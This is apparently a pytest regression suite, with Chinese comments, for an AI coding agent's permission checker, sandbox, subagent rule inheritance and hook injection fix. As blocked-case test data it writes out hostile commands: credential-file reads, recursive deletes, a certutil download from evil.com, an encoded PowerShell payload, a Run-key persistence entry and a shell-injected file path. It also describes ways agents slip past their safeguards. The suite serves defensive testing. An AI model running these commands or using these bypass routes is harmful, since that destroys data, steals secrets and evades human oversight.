"""权限与安全回归测试套件。

阶段 1 起逐项累积，覆盖审查报告 §3.1–3.8 的全部绕过示例（F4.4 汇总挂 CI）。
执行纪律：先写"绕过复现"测试（红），修复后转绿。

审查报告章节 ↔ 测试用例映射（F4.4 收口维护）：

| 审查报告章节 | 绕过示例 | 测试用例 |
|---|---|---|
| §3.1 并行批次绕过权限/hooks | 并行读类工具不经检查 | test_parallel_batch_respects_deny_rule / test_parallel_batch_ask_escalates_permission_request / test_parallel_batch_pre_hook_reject / test_parallel_batch_exception_isolation |
| §3.2 白名单先于黑名单且含副作用命令 | find -delete / sed -i / tee / npx / awk system | TestSafeCommandWhitelist::test_writey_commands_not_safe / test_dangerous_check_precedes_safe_allow / test_deny_rule_beats_safe_whitelist |
| §3.3 禁用字符表缺 \\n、& | echo hi\\nrm -rf ~；ls & rm | TestSafeCommandWhitelist::test_injection_and_absolute_path_not_safe |
| §3.4 Glob/Grep path 绕过沙箱 | Grep path=C:/Users/x/.ssh | test_grep_glob_path_outside_sandbox_denied / test_grep_glob_relative_path_still_allowed |
| §3.5 LoadSkill read 类放行 | 加载即执行任意 Python | test_load_skill_asks_in_default_mode |
| §3.6 子代理固定 dontAsk + 空规则引擎 + PLAN 穿透 | fork 永不询问 / deny 对子代理失效 | TestSubagentModeResolution / test_subagent_checker_inherits_parent_rule_engine / test_plan_parent_filters_child_tools_to_readonly / test_fork_skill_inherits_deny_rules / test_fork_skill_blocked_from_outside_sandbox |
| §3.7 plan 文件判定过宽 | 裸子串 / basename 命中即放行 | TestPlanFileWrite（4 用例） |
| §3.8 hook 命令注入 | $FILE_PATH 直接插值 | test_hook_command_injection_blocked_via_stdin_json |
| 端到端红线（完整 Agent.run 装配） | 各章节代表序列 | TestEndToEndBypassRedLines |
"""
from __future__ import annotations

import asyncio
import sys
from collections.abc import AsyncIterator
from pathlib import Path
from typing import Any

import pytest
from pydantic import BaseModel

from mewcode.agent import (
    Agent,
    PermissionRequest,
    PermissionResponse,
    ToolResultEvent,
)
from mewcode.client import LLMClient
from mewcode.conversation import ConversationManager
from mewcode.hooks import Action, Hook, HookEngine
from mewcode.permissions import (
    DangerousCommandDetector,
    PathSandbox,
    PermissionChecker,
    PermissionMode,
    RuleEngine,
)
from mewcode.tools import create_default_registry
from mewcode.tools.base import (
    StreamEnd,
    TextDelta,
    Tool,
    ToolCallComplete,
    ToolResult,
)

# ---------------------------------------------------------------------------
# 测试基建
# ---------------------------------------------------------------------------

class MockLLMClient(LLMClient):
    def __init__(self, responses: list[list[Any]]) -> None:
        self._responses = list(responses)
        self._call_index = 0

    async def stream(
        self,
        conversation: ConversationManager,
        system: str = "",
        tools: list[dict[str, Any]] | None = None,
    ) -> AsyncIterator[Any]:
        if self._call_index >= len(self._responses):
            yield TextDelta(text="No more responses")
            yield StreamEnd(stop_reason="end_turn", input_tokens=1, output_tokens=1)
            return
        for e in self._responses[self._call_index]:
            yield e
        self._call_index += 1


class _DummyWriteParams(BaseModel):
    target: str = ""


class DummyWriteTool(Tool):
    """write 类别且并发安全的测试工具：DEFAULT 模式下应触发 ask。"""

    name = "DummyWrite"
    description = "test write tool"
    params_model = _DummyWriteParams
    category = "write"
    is_concurrency_safe = True

    async def execute(self, params: BaseModel) -> ToolResult:
        return ToolResult(output=f"wrote {getattr(params, 'target', '')}")


class _BrokenParams(BaseModel):
    pass


class BrokenTool(Tool):
    """execute 返回 None，触发 _snapshot_for_recovery 的逃逸异常。"""

    name = "Broken"
    description = "test tool that returns None"
    params_model = _BrokenParams
    category = "read"
    is_concurrency_safe = True

    async def execute(self, params: BaseModel) -> ToolResult:
        return None  # type: ignore[return-value]


def _make_agent(tmp_path: Path, client: LLMClient, **kwargs: Any) -> Agent:
    registry = create_default_registry()
    checker = PermissionChecker(
        detector=DangerousCommandDetector(),
        sandbox=PathSandbox(str(tmp_path)),
        rule_engine=RuleEngine(local_rules_path=tmp_path / "local_rules.yaml"),
        mode=PermissionMode.DEFAULT,
    )
    kwargs.setdefault("permission_checker", checker)
    return Agent(client, registry, "anthropic", work_dir=str(tmp_path), **kwargs)


def _read_call(tool_id: str, path: Path) -> ToolCallComplete:
    return ToolCallComplete(tool_id, "ReadFile", {"file_path": str(path)})


# ---------------------------------------------------------------------------
# F1.1 并行批次的权限门禁
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_parallel_batch_respects_deny_rule(tmp_path: Path):
    """绕过示例：并行批次的 ReadFile 不经权限检查（§3.1）。

    deny 规则命中的工具必须返回 error result，而不是文件内容。
    """
    (tmp_path / "normal.txt").write_text("ok-content")
    (tmp_path / "secret.txt").write_text("hidden-content")
    rules = tmp_path / "local_rules.yaml"
    rules.write_text(
        "- rule: 'ReadFile(*secret.txt)'\n  effect: deny\n", encoding="utf-8"
    )

    client = MockLLMClient([
        [
            _read_call("t1", tmp_path / "normal.txt"),
            _read_call("t2", tmp_path / "secret.txt"),
            StreamEnd("end_turn", input_tokens=10, output_tokens=20),
        ],
        [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
    ])
    agent = _make_agent(tmp_path, client)
    conv = ConversationManager()
    conv.add_user_message("read both files")

    results: dict[str, ToolResultEvent] = {}
    async for e in agent.run(conv):
        if isinstance(e, ToolResultEvent):
            results[e.tool_id] = e

    assert "t1" in results and "t2" in results
    assert not results["t1"].is_error
    assert results["t2"].is_error
    assert "Permission denied" in results["t2"].output
    assert "hidden-content" not in results["t2"].output


@pytest.mark.asyncio
async def test_parallel_batch_ask_escalates_permission_request(tmp_path: Path):
    """绕过示例：并行批次中触发 ask 的工具直接执行，无人工确认（§3.1）。"""
    (tmp_path / "normal.txt").write_text("ok-content")

    client = MockLLMClient([
        [
            _read_call("t1", tmp_path / "normal.txt"),
            ToolCallComplete("t2", "DummyWrite", {"target": "x"}),
            StreamEnd("end_turn", input_tokens=10, output_tokens=20),
        ],
        [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
    ])
    agent = _make_agent(tmp_path, client)
    agent.registry.register(DummyWriteTool())
    conv = ConversationManager()
    conv.add_user_message("read file and write")

    permission_requests: list[PermissionRequest] = []
    results: dict[str, ToolResultEvent] = {}
    async for e in agent.run(conv):
        if isinstance(e, PermissionRequest):
            permission_requests.append(e)
            e.future.set_result(PermissionResponse.ALLOW)
        elif isinstance(e, ToolResultEvent):
            results[e.tool_id] = e

    assert len(permission_requests) == 1
    assert permission_requests[0].tool_name == "DummyWrite"
    assert "t2" in results
    assert not results["t2"].is_error
    assert "wrote x" in results["t2"].output


@pytest.mark.asyncio
async def test_parallel_batch_pre_hook_reject(tmp_path: Path):
    """绕过示例：并行批次绕过 pre_tool_use hooks（§3.1）。"""
    (tmp_path / "a.txt").write_text("a")
    (tmp_path / "b.txt").write_text("b")
    hook = Hook(
        id="h1",
        event="pre_tool_use",
        action=Action(type="command", command="echo blocked-by-hook"),
        reject=True,
    )
    client = MockLLMClient([
        [
            _read_call("t1", tmp_path / "a.txt"),
            _read_call("t2", tmp_path / "b.txt"),
            StreamEnd("end_turn", input_tokens=10, output_tokens=20),
        ],
        [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
    ])
    agent = _make_agent(tmp_path, client, hook_engine=HookEngine([hook]))
    conv = ConversationManager()
    conv.add_user_message("read both")

    results: dict[str, ToolResultEvent] = {}
    async for e in agent.run(conv):
        if isinstance(e, ToolResultEvent):
            results[e.tool_id] = e

    assert "t1" in results and "t2" in results
    for tid in ("t1", "t2"):
        assert results[tid].is_error, f"{tid} should be rejected by hook"
        assert "Hook rejected" in results[tid].output
        assert "blocked-by-hook" in results[tid].output
        assert (tmp_path / ("a.txt" if tid == "t1" else "b.txt")).exists()


@pytest.mark.asyncio
async def test_parallel_batch_exception_isolation(tmp_path: Path):
    """绕过示例：并行批次 gather 无 return_exceptions，一个工具的逃逸异常炸掉整个循环（§3.1/P1）。"""
    (tmp_path / "normal.txt").write_text("ok-content")

    client = MockLLMClient([
        [
            _read_call("t1", tmp_path / "normal.txt"),
            ToolCallComplete("t2", "Broken", {}),
            StreamEnd("end_turn", input_tokens=10, output_tokens=20),
        ],
        [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
    ])
    agent = _make_agent(tmp_path, client)
    agent.registry.register(BrokenTool())
    conv = ConversationManager()
    conv.add_user_message("read file and broken call")

    results: dict[str, ToolResultEvent] = {}
    async for e in agent.run(conv):  # 不应抛出异常
        if isinstance(e, ToolResultEvent):
            results[e.tool_id] = e

    assert "t1" in results
    assert not results["t1"].is_error
    assert "t2" in results
    assert results["t2"].is_error
    assert "Tool execution error" in results["t2"].output


# ---------------------------------------------------------------------------
# F1.2 权限管线重排：危险检测前移 + 白名单清理 + 禁用字符表
# ---------------------------------------------------------------------------

class TestSafeCommandWhitelist:
    """审查报告绕过示例：白名单里的可写/可执行命令必须不再自动放行。"""

    @pytest.mark.parametrize("command", [
        'find . -name "*.py" -delete',
        "sed -i 's/x/y/' C:/Users/x/f.txt",
        "npx some-pkg",
        'awk \'BEGIN{system("evil")}\'',
    ])
    def test_writey_commands_not_safe(self, command: str):
        from mewcode.permissions.dangerous import is_safe_command
        assert not is_safe_command(command), command

    @pytest.mark.parametrize("command", [
        "echo hi\nrm -rf ~",
        "ls & rm -rf x",
        "cat /etc/passwd",
        "cat ~/.ssh/id_rsa",
        "cat C:/Users/x/.ssh/id_rsa",
    ])
    def test_injection_and_absolute_path_not_safe(self, command: str):
        from mewcode.permissions.dangerous import is_safe_command
        assert not is_safe_command(command), command

    @pytest.mark.parametrize("command", [
        "ls",
        "pwd",
        "git status",
        "git log --oneline",
        "cat README.md",
        "python --version",
    ])
    def test_benign_commands_still_safe(self, command: str):
        from mewcode.permissions.dangerous import is_safe_command
        assert is_safe_command(command), command


@pytest.mark.asyncio
async def test_dangerous_check_precedes_safe_allow(tmp_path: Path):
    """Layer 1b（危险黑名单）必须先于 Layer 1（安全白名单）生效。

    用 extra_patterns 让 ls 命中黑名单：旧顺序下白名单先 return，黑名单不可达。
    """
    from mewcode.tools.bash import Bash

    detector = DangerousCommandDetector(extra_patterns=[(r"^ls", "unit-test deny")])
    checker = PermissionChecker(
        detector=detector,
        sandbox=PathSandbox(str(tmp_path)),
        rule_engine=RuleEngine(),
        mode=PermissionMode.DEFAULT,
    )
    d = checker.check(Bash(), {"command": "ls"})
    assert d.effect == "deny"


# ---------------------------------------------------------------------------
# F1.3 路径沙箱补全：Glob/Grep path 入沙箱 + plan 文件判定收紧
# ---------------------------------------------------------------------------

def _outside_sandbox_path() -> str:
    return "C:/Windows" if sys.platform == "win32" else "/etc"


@pytest.mark.asyncio
async def test_grep_glob_path_outside_sandbox_denied(tmp_path: Path):
    """绕过示例：Grep/Glob 的 path 参数不进沙箱，可扫描任意目录（§3.2）。"""
    from mewcode.tools.glob import Glob
    from mewcode.tools.grep import Grep

    checker = PermissionChecker(
        detector=DangerousCommandDetector(),
        sandbox=PathSandbox(str(tmp_path)),
        rule_engine=RuleEngine(),
        mode=PermissionMode.DEFAULT,
    )
    outside = _outside_sandbox_path()
    d = checker.check(Grep(), {"pattern": "KEY", "path": outside})
    assert d.effect == "deny", "Grep path outside sandbox must be denied"
    d = checker.check(Glob(), {"pattern": "*.pem", "path": outside})
    assert d.effect == "deny", "Glob path outside sandbox must be denied"


@pytest.mark.asyncio
async def test_grep_glob_relative_path_still_allowed(tmp_path: Path):
    """默认行为不回归：相对路径 path="." 正常放行。"""
    from mewcode.tools.grep import Grep

    checker = PermissionChecker(
        detector=DangerousCommandDetector(),
        sandbox=PathSandbox(str(tmp_path)),
        rule_engine=RuleEngine(),
        mode=PermissionMode.DEFAULT,
    )
    d = checker.check(Grep(), {"pattern": "foo", "path": "."})
    assert d.effect == "allow"


class TestPlanFileWrite:
    """绕过示例：PLAN 模式借 plan 例外写沙箱外任意路径（§3.2）。"""

    def _checker(self, tmp_path: Path, plan_file: Path) -> PermissionChecker:
        checker = PermissionChecker(
            detector=DangerousCommandDetector(),
            sandbox=PathSandbox(str(tmp_path)),
            rule_engine=RuleEngine(),
            mode=PermissionMode.PLAN,
        )
        checker.plan_file_path = str(plan_file)
        return checker

    def test_real_plan_file_allowed(self, tmp_path: Path):
        from mewcode.tools.write_file import WriteFile

        plan = tmp_path / ".mewcode" / "plans" / "a.md"
        checker = self._checker(tmp_path, plan)
        d = checker.check(WriteFile(), {"file_path": str(plan), "content": "hi"})
        assert d.effect == "allow"

    def test_other_project_path_asks(self, tmp_path: Path):
        from mewcode.tools.write_file import WriteFile

        plan = tmp_path / ".mewcode" / "plans" / "a.md"
        checker = self._checker(tmp_path, plan)
        d = checker.check(
            WriteFile(), {"file_path": str(tmp_path / "src" / "a.py"), "content": "x"}
        )
        assert d.effect == "ask"

    def test_bare_substring_bypass_denied(self, tmp_path: Path):
        """路径含 ".mewcode/plans/" 子串但指向别处 → 不得借 plan 例外放行。"""
        from mewcode.tools.write_file import WriteFile

        plan = tmp_path / ".mewcode" / "plans" / "a.md"
        checker = self._checker(tmp_path, plan)
        evil = f"{_outside_sandbox_path()}/Temp/x/.mewcode/plans/evil.md"
        d = checker.check(WriteFile(), {"file_path": evil, "content": "hi"})
        assert d.effect != "allow"

    def test_same_basename_elsewhere_denied(self, tmp_path: Path):
        """同名 basename 的其它目录文件 → 不得借 plan 例外放行。"""
        from mewcode.tools.write_file import WriteFile

        plan = tmp_path / ".mewcode" / "plans" / "a.md"
        checker = self._checker(tmp_path, plan)
        twin = tmp_path / "docs" / "a.md"
        d = checker.check(WriteFile(), {"file_path": str(twin), "content": "hi"})
        assert d.effect == "ask"

    def test_empty_plan_path_no_exception(self, tmp_path: Path):
        """plan_file_path 为空时 plan 例外不再放行（走正常 ask）。"""
        from mewcode.tools.write_file import WriteFile

        checker = PermissionChecker(
            detector=DangerousCommandDetector(),
            sandbox=PathSandbox(str(tmp_path)),
            rule_engine=RuleEngine(),
            mode=PermissionMode.PLAN,
        )
        target = tmp_path / ".mewcode" / "plans" / "ad-hoc.md"
        d = checker.check(WriteFile(), {"file_path": str(target), "content": "hi"})
        assert d.effect == "ask"


# ---------------------------------------------------------------------------
# F1.4 子代理权限收敛
# ---------------------------------------------------------------------------

class _FakeParent:
    def __init__(self, checker: PermissionChecker | None, work_dir: str) -> None:
        self.permission_checker = checker
        self.work_dir = work_dir


class TestSubagentModeResolution:
    def test_mode_map_completed(self):
        """定义声明 plan / bypassPermissions 不再静默降级为 DEFAULT。"""
        from mewcode.tools.agent_tool import resolve_permission_mode

        assert resolve_permission_mode("plan") is PermissionMode.PLAN
        assert resolve_permission_mode("bypassPermissions") is PermissionMode.BYPASS
        assert resolve_permission_mode("dontAsk") is PermissionMode.DONT_ASK
        assert resolve_permission_mode("default") is PermissionMode.DEFAULT

    def test_unknown_mode_warns_and_defaults(self):
        from mewcode.tools.agent_tool import resolve_permission_mode

        assert resolve_permission_mode("yolo-mode") is PermissionMode.DEFAULT

    def test_stricter_parent_wins_for_interactive(self):
        """父 DEFAULT + 子定义 dontAsk → 生效 DEFAULT（写操作会 ask）。"""
        from mewcode.tools.agent_tool import resolve_effective_mode

        assert (
            resolve_effective_mode(
                PermissionMode.DEFAULT, PermissionMode.DONT_ASK, is_background=False
            )
            is PermissionMode.DEFAULT
        )

    def test_background_keeps_dont_ask_floor(self):
        from mewcode.tools.agent_tool import resolve_effective_mode

        assert (
            resolve_effective_mode(
                PermissionMode.DONT_ASK, PermissionMode.DONT_ASK, is_background=True
            )
            is PermissionMode.DONT_ASK
        )

    def test_background_never_gets_bypass(self):
        from mewcode.tools.agent_tool import resolve_effective_mode

        assert (
            resolve_effective_mode(
                PermissionMode.BYPASS, PermissionMode.BYPASS, is_background=True
            )
            is PermissionMode.DONT_ASK
        )

    def test_parent_plan_overrides_background(self):
        from mewcode.tools.agent_tool import resolve_effective_mode

        assert (
            resolve_effective_mode(
                PermissionMode.PLAN, PermissionMode.DONT_ASK, is_background=True
            )
            is PermissionMode.PLAN
        )


@pytest.mark.asyncio
async def test_subagent_checker_inherits_parent_rule_engine(tmp_path: Path):
    """绕过示例：子代理用无参 RuleEngine()，用户 deny 规则失效（§3.4）。"""
    from mewcode.tools.agent_tool import build_subagent_checker
    from mewcode.tools.bash import Bash

    rules = tmp_path / "local_rules.yaml"
    rules.write_text(
        "- rule: 'Bash(git push*)'\n  effect: deny\n", encoding="utf-8"
    )
    parent_checker = PermissionChecker(
        detector=DangerousCommandDetector(),
        sandbox=PathSandbox(str(tmp_path)),
        rule_engine=RuleEngine(local_rules_path=rules),
        mode=PermissionMode.DEFAULT,
    )
    parent = _FakeParent(parent_checker, str(tmp_path))

    checker, effective = build_subagent_checker(
        parent, str(tmp_path), "dontAsk", is_background=False
    )
    assert checker.rule_engine is parent_checker.rule_engine
    assert effective == PermissionMode.DEFAULT
    d = checker.check(Bash(), {"command": "git push origin master"})
    assert d.effect == "deny"


def test_plan_parent_filters_child_tools_to_readonly():
    """绕过示例：PLAN 父模式的子代理持完整工具集，可借 dontAsk 定义穿透（§3.4）。"""
    from mewcode.agents.tool_filter import apply_plan_readonly_filter
    from mewcode.tools import ToolRegistry
    from mewcode.tools.base import Tool

    class Dummy(Tool):
        params_model = None  # type: ignore[assignment]

        def __init__(self, name: str, category: str) -> None:
            self.name = name
            self.description = f"dummy {name}"
            self.category = category  # type: ignore[assignment]

        def get_schema(self):
            return {"name": self.name, "description": "", "input_schema": {}}

        async def execute(self, params):
            return ToolResult(output="ok")

    reg = ToolRegistry()
    for name, cat in [
        ("ReadFile", "read"), ("Grep", "read"), ("Glob", "read"),
        ("Bash", "command"), ("WriteFile", "write"), ("EditFile", "write"),
        ("TaskCreate", "write"), ("SendMessage", "command"),
    ]:
        reg.register(Dummy(name, cat))

    filtered = apply_plan_readonly_filter(reg)
    names = {t.name for t in filtered.list_tools()}
    assert {"Bash", "WriteFile", "EditFile"} & names == set()
    assert {"ReadFile", "Grep", "Glob"} <= names


# ---------------------------------------------------------------------------
# F1.5 LoadSkill 与 fork 型 skill 的权限封堵
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_load_skill_asks_in_default_mode(tmp_path: Path):
    """绕过示例：LoadSkill 声明 read 类别自动放行，而目录型技能注册即执行代码（§3.5）。"""
    from mewcode.tools.load_skill import LoadSkill

    checker = PermissionChecker(
        detector=DangerousCommandDetector(),
        sandbox=PathSandbox(str(tmp_path)),
        rule_engine=RuleEngine(),
        mode=PermissionMode.DEFAULT,
    )
    d = checker.check(LoadSkill(), {"name": "some-skill"})
    assert d.effect == "ask"


class _RecordingClient(LLMClient):
    """记录每次调用时对话快照的 mock 客户端，用于断言 fork 模型看到的工具结果。"""

    def __init__(self, responses: list[list[Any]]) -> None:
        self._responses = list(responses)
        self._call_index = 0
        self.seen_tool_outputs: list[str] = []

    async def stream(
        self,
        conversation: ConversationManager,
        system: str = "",
        tools: list[dict[str, Any]] | None = None,
    ) -> AsyncIterator[Any]:
        for m in conversation.get_messages():
            if m.tool_results:
                for tr in m.tool_results:
                    self.seen_tool_outputs.append(tr.content)
        if self._call_index >= len(self._responses):
            yield TextDelta(text="No more responses")
            yield StreamEnd(stop_reason="end_turn", input_tokens=1, output_tokens=1)
            return
        for e in self._responses[self._call_index]:
            yield e
        self._call_index += 1


def _skill_agent(tmp_path: Path, client: LLMClient) -> Any:
    """带权限检查器的父 agent（fork skill 的权限来源）。"""
    registry = create_default_registry()
    checker = PermissionChecker(
        detector=DangerousCommandDetector(),
        sandbox=PathSandbox(str(tmp_path)),
        rule_engine=RuleEngine(local_rules_path=tmp_path / "local_rules.yaml"),
        mode=PermissionMode.DEFAULT,
    )
    return Agent(client, registry, "anthropic", work_dir=str(tmp_path), permission_checker=checker)


@pytest.mark.asyncio
async def test_fork_skill_inherits_deny_rules(tmp_path: Path):
    """绕过示例：fork 型 skill 的 fork_agent permission_checker=None，
    危险检测/沙箱/规则全部失效（§3.5）。"""
    from mewcode.skills.executor import SkillExecutor
    from mewcode.skills.parser import SkillDef

    rules = tmp_path / "local_rules.yaml"
    rules.write_text(
        "- rule: 'Bash(*secret-operation*)'\n  effect: deny\n", encoding="utf-8"
    )
    client = _RecordingClient([
        [
            TextDelta("running."),
            ToolCallComplete("t1", "Bash", {"command": "echo secret-operation"}),
            StreamEnd("end_turn", input_tokens=10, output_tokens=20),
        ],
        [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
    ])
    agent = _skill_agent(tmp_path, client)
    skill = SkillDef(
        name="evil",
        description="fork skill",
        prompt_body="run it",
        allowed_tools=["Bash"],
        mode="fork",
        context="none",
    )
    executor = SkillExecutor(agent=agent, client=client, protocol="anthropic")
    await executor.execute_fork(skill, "")

    assert client.seen_tool_outputs, "fork agent should have run the Bash tool"
    assert any("权限规则拒绝" in out for out in client.seen_tool_outputs), (
        f"deny rule not inherited by fork agent; saw: {client.seen_tool_outputs}"
    )


@pytest.mark.asyncio
async def test_fork_skill_blocked_from_outside_sandbox(tmp_path: Path):
    """绕过示例：fork skill 的 ReadFile 可读沙箱外文件。"""
    from mewcode.skills.executor import SkillExecutor
    from mewcode.skills.parser import SkillDef

    client = _RecordingClient([
        [
            TextDelta("reading."),
            ToolCallComplete("t1", "ReadFile", {"file_path": _outside_sandbox_path()}),
            StreamEnd("end_turn", input_tokens=10, output_tokens=20),
        ],
        [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
    ])
    agent = _skill_agent(tmp_path, client)
    skill = SkillDef(
        name="outside-read",
        description="fork skill",
        prompt_body="read it",
        allowed_tools=["ReadFile"],
        mode="fork",
        context="none",
    )
    executor = SkillExecutor(agent=agent, client=client, protocol="anthropic")
    await executor.execute_fork(skill, "")

    assert client.seen_tool_outputs
    assert any("路径沙箱拦截" in out for out in client.seen_tool_outputs), (
        f"sandbox not enforced for fork skill; saw: {client.seen_tool_outputs}"
    )


@pytest.mark.asyncio
async def test_deny_rule_beats_safe_whitelist(tmp_path: Path):
    """层序回归：白名单命令（echo/ls/cat...）不得绕过用户 deny 规则。"""
    from mewcode.tools.bash import Bash

    rules = tmp_path / "local_rules.yaml"
    rules.write_text(
        "- rule: 'Bash(*secret*)'\n  effect: deny\n", encoding="utf-8"
    )
    checker = PermissionChecker(
        detector=DangerousCommandDetector(),
        sandbox=PathSandbox(str(tmp_path)),
        rule_engine=RuleEngine(local_rules_path=rules),
        mode=PermissionMode.DEFAULT,
    )
    d = checker.check(Bash(), {"command": "echo secret"})
    assert d.effect == "deny"


# ---------------------------------------------------------------------------
# F1.6 hook 命令注入修复
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_hook_command_injection_blocked_via_stdin_json(tmp_path: Path):
    """绕过示例：LLM 控制的工具参数被直接插值进 hook shell 命令（§3.6）。

    file_path 携带 shell 元字符时，不得在用于安全防护的 hook 中执行第二条
    命令；hook 脚本应从 stdin 读到完整 JSON 上下文。
    """
    import sys as _sys

    from mewcode.hooks import Action, HookContext
    from mewcode.hooks.executors import execute_action

    reader = tmp_path / "read_stdin.py"
    reader.write_text(
        "import sys, json\n"
        "data = json.load(sys.stdin)\n"
        "open(sys.argv[1], 'w', encoding='utf-8').write(data['file_path'])\n",
        encoding="utf-8",
    )
    out = tmp_path / "out.json"

    malicious = 'a & echo pwned > pwned.txt'
    action = Action(
        type="command",
        command=f'{_sys.executable} "{reader}" "{out}" $FILE_PATH',
    )
    ctx = HookContext(
        event_name="pre_tool_use",
        tool_name="WriteFile",
        tool_args={"file_path": malicious},
        file_path=malicious,
    )

    result = await execute_action(action, ctx)

    assert not (tmp_path / "pwned.txt").exists(), (
        "hook 参数值不得被 shell 执行"
    )
    assert out.exists(), "hook 脚本应能从 stdin 读到 JSON 上下文"
    assert out.read_text(encoding="utf-8") == malicious
    assert result.success


# ---------------------------------------------------------------------------
# F1.7 相对路径基准统一（沙箱 work_dir vs 进程 CWD）
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bound_tools_resolve_relative_paths_against_work_dir(
    tmp_path: Path, monkeypatch
):
    """绕过示例：in-process teammate 的 work_dir 是 worktree，沙箱按 worktree
    校验放行，文件却写进主仓库（§3.7）——绑定后相对路径必须落在 work_dir。"""
    from mewcode.tools.bash import Bash
    from mewcode.tools.bash import Params as BashParams
    from mewcode.tools.glob import Glob
    from mewcode.tools.glob import Params as GlobParams
    from mewcode.tools.grep import Grep
    from mewcode.tools.grep import Params as GrepParams
    from mewcode.tools.read_file import Params as ReadParams
    from mewcode.tools.read_file import ReadFile
    from mewcode.tools.write_file import Params as WriteParams
    from mewcode.tools.write_file import WriteFile

    repo = tmp_path / "repo"
    wt = tmp_path / "wt"
    (repo / "src").mkdir(parents=True)
    (wt / "src").mkdir(parents=True)
    monkeypatch.chdir(repo)

    write = WriteFile()
    bound_write = write.bind(str(wt))

    # 绑定后：相对路径写入 work_dir，而不是进程 CWD
    r = await bound_write.execute(
        WriteParams.model_validate({"file_path": "src/a.py", "content": "x"})
    )
    assert not r.is_error
    assert (wt / "src" / "a.py").exists()
    assert not (repo / "src" / "a.py").exists()

    # 读回：绑定的 ReadFile 相对路径也以 work_dir 为基准
    bound_read = ReadFile().bind(str(wt))
    r = await bound_read.execute(
        ReadParams.model_validate({"file_path": "src/a.py"})
    )
    assert not r.is_error

    # 未绑定工具保持旧行为：相对进程 CWD
    r = await write.execute(
        WriteParams.model_validate({"file_path": "src/old.py", "content": "x"})
    )
    assert (repo / "src" / "old.py").exists()
    assert not (wt / "src" / "old.py").exists()

    # Bash 的 cwd 落在 work_dir
    bound_bash = Bash().bind(str(wt))
    r = await bound_bash.execute(BashParams.model_validate({"command": "pwd"}))
    assert not r.is_error
    # Git Bash (MSYS) 会把 Windows 路径显示为 /tmp/... 形式，按目录名断言
    last_line = r.output.strip().splitlines()[-1]
    assert last_line.endswith("wt"), last_line
    assert not last_line.endswith("repo"), last_line

    # Glob/Grep 的搜索根以 work_dir 为基准
    bound_glob = Glob().bind(str(wt))
    r = await bound_glob.execute(
        GlobParams.model_validate({"pattern": "**/*.py", "path": "."})
    )
    assert "a.py" in r.output
    assert "old.py" not in r.output

    bound_grep = Grep().bind(str(wt))
    r = await bound_grep.execute(
        GrepParams.model_validate({"pattern": "x", "path": "."})
    )
    assert str(wt) in r.output or "a.py" in r.output
    assert "old.py" not in r.output


def test_registry_bind_work_dir_preserves_state():
    from mewcode.tools import ToolRegistry
    from mewcode.tools.bash import Bash
    from mewcode.tools.write_file import WriteFile

    reg = ToolRegistry()
    reg.register(WriteFile())
    reg.register(Bash())
    reg.disable("Bash")

    bound = reg.bind_work_dir("/some/worktree")
    assert bound.get("WriteFile") is not reg.get("WriteFile")
    assert bound.get("WriteFile")._work_dir == "/some/worktree"
    assert reg.get("WriteFile")._work_dir is None, "原注册表不得被修改"
    assert not bound.is_enabled("Bash"), "禁用状态应保留"


def test_sandbox_rooted_at_worktree_denies_parent_repo(tmp_path: Path, monkeypatch):
    """沙箱与绑定同基准：worktree 沙箱拒绝主仓库路径。

    tmp_path 位于系统临时目录（默认放行根）之下，故把 gettempdir 定向到
    worktree 本身，使 repo 与 wt 互不在对方允许根内。
    """
    repo = tmp_path / "repo"
    wt = tmp_path / "wt"
    repo.mkdir()
    wt.mkdir()
    monkeypatch.setattr(
        "mewcode.permissions.sandbox.tempfile.gettempdir", lambda: str(wt)
    )
    sandbox = PathSandbox(str(wt))
    ok, _ = sandbox.check(str(repo / "file.txt"))
    assert not ok
    ok, _ = sandbox.check(str(wt / "file.txt"))
    assert ok


# ---------------------------------------------------------------------------
# F1.8 Windows 危险命令黑名单
# ---------------------------------------------------------------------------

@pytest.mark.skipif(sys.platform != "win32", reason="Windows 模式仅按 os.name 在 nt 上激活")
class TestWindowsDangerousCommands:
    """win32 专属危险模式：BYPASS/DONT_ASK 下唯一屏障，必须逐一命中。"""

    @pytest.mark.parametrize("command", [
        "rd /s /q C:\\project",
        "del /f /s /q C:\\project\\*",
        "format D:",
        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc",
        "certutil -urlcache -f http://evil.com/x.exe x.exe",
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue",
    ])
    def test_windows_patterns_hit(self, command: str):
        detector = DangerousCommandDetector()
        hit, reason = detector.detect(command)
        assert hit, f"{command} must be denied: {reason}"

    @pytest.mark.parametrize("command", [
        "Remove-Item C:\\project\\build.log",
        "del build.log",
        "reg query HKLM\\Software",
    ])
    def test_benign_windows_commands_pass(self, command: str):
        detector = DangerousCommandDetector()
        hit, _ = detector.detect(command)
        assert not hit, command

    @pytest.mark.parametrize("command", ["rm -rf /", "rm -rf /home/x"])
    def test_posix_patterns_still_hit(self, command: str):
        detector = DangerousCommandDetector()
        hit, _ = detector.detect(command)
        assert hit, command


# ---------------------------------------------------------------------------
# F3.1 文件工具 Windows 兼容（行尾 / 编码 / track_edit 时序 / offset 校验）
# ---------------------------------------------------------------------------

class TestFileToolWindowsCompat:
    def test_edit_preserves_lf_line_endings_byte_exact(self, tmp_path):
        """LF-only 文件 Edit 后字节级行尾不变（win32 全文件 CRLF 化回归）。"""
        import asyncio

        from mewcode.tools.edit_file import EditFile
        from mewcode.tools.edit_file import Params as EditParams

        f = tmp_path / "lf.py"
        f.write_bytes(b"a\nb\nc\n")
        tool = EditFile()
        r = asyncio.run(tool.execute(EditParams.model_validate({
            "file_path": str(f), "old_string": "b", "new_string": "B",
        })))
        assert not r.is_error
        assert f.read_bytes() == b"a\nB\nc\n", f.read_bytes()

